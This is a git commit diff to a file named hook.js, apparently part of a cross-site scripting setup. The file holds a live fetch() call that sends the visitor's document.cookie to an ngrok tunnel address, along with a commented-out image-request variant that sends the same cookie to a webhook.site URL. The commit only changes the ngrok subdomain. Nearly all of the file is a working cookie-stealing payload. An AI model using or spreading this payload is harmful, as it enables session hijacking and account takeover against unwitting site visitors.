3458cf4682accdc4a63ee78d5488578c97631cd8
itsoktocryy <73375576+itsoktocryy@users.noreply.github.com>
2023-12-25 21:08:14 +0100

    up

--- hook.js
+++ hook.js
@@ -1,3 +1,3 @@
 //var i=new Image;i.src="https://webhook.site/53eeee4f-e6ef-4c9c-9b93-299f5ef65316?cookie="+document.cookie;
 
-fetch('https://1b37-83-235-111-147.ngrok-free.app?c=' + document.cookie)
+fetch('https://cd4e-83-235-111-147.ngrok-free.app?c=' + document.cookie)
